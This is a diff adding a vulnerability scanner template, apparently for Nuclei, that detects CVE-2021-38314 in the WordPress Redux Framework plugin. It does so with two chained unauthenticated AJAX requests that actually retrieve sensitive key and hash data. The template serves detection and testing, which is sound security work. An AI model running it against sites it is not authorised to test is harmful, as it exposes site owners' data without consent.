@@ -1,0 +1,43 @@
+id: wordpress-redux-framework-info-disclosure
+
+info:
+  name: WordPress Redux Framework Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    WordPress Redux Framework plugin <= 4.2.11 allows unauthenticated users to exploit certain AJAX operations, leading to sensitive information disclosure.
+  reference:
+    - https://redux.io
+  classification:
+    cve-id: CVE-2021-38314
+    cvss-score: 5.3
+
+variables:
+  key1: '{{md5(concat(Hostname, "/-redux"))}}'
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action={{key1}} HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: key2
+        group: 0
+        internal: true
+        regex:
+          - "^.+$"
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action={{md5(concat(key2, "-support"))}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "key"
+        part: body
+      - type: word
+        words:
+          - "hash"
+        part: body
